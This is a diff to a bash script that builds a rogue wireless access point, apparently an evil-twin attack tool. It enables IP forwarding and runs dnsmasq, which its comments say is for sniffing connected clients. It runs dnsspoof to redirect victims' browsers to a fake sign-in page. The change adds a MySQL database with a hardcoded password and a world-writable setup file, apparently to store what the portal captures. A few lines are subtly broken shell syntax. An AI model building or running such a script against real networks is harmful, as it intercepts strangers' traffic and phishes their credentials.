@@ -19,7 +19,8 @@ green=`tput setaf 2`
 yellow=`tput setaf 3`
 resetColor=`tput sgr0`
 DELAY=3
-MON=mon 
+MON=mon
+service mysql start $NULL 
 service apache2 stop 2&$NULL
 gunzip /usr/share/wordlists/rockyou.txt.gz $NULL
 echo 1 > /proc/sys/net/ipv4/ip_forward 				# Allows for internet access on setup AP
@@ -250,10 +251,23 @@ while [[ $(id -u) == 0 ]] ; do
 			fi	
 			echo "${yellow}Setting up DNSmasq now, this will allow you to sniff traffic on clients connected to you.${resetColor}" 
 			sleep 5
-			gnome-terminal -x dnsmasq -C /bin/dnsmasq.conf -d 	# -C for loading configuration and -d for daemon mode 
-					
-			#service mysql start 					# Needs fix								
+			gnome-terminal -x dnsmasq -C /bin/dnsmasq.conf -d 	# -C for loading configuration and -d for daemon mode
+			echo "${green}Setting up the mysql database, the default password is 'fakeap' ${resetColor}"
+			chmod 777 SQL-Setup.sql
+			sleep $DELAY 
+			mysql < SQL-Setup.sql
+			sleep 2
+			read -p "${yellow}Would you like to put a set of test values into the database to ensure it worked [y/n] ${resetColor}?: " TESTSQL
+				if [ $TESTSQL == y] ; then
+					mysql -u fakeap -p < SQL-FakeapTEST.sql
+					sleep 2
+					echo "SQL setup complete"
+				fi
+				if [ $TESTSQL == n ] ; then
+					echo "SQL setup complete"
+				fi  										
   			sleep $DELAY
+			clear
   			echo "${yellow}Setting up DNSspoof, allowing for site redirects.${resetColor}"
   			gnome-terminal -x dnsspoof -i at0																# opens another terminal, dnsspoof pointed to the at0 interface will redirect traffic to our Rougue_AP directory in our python server, as soon as the client loads their browser, emulating a public wifi network you have to sign into.
   			clear			
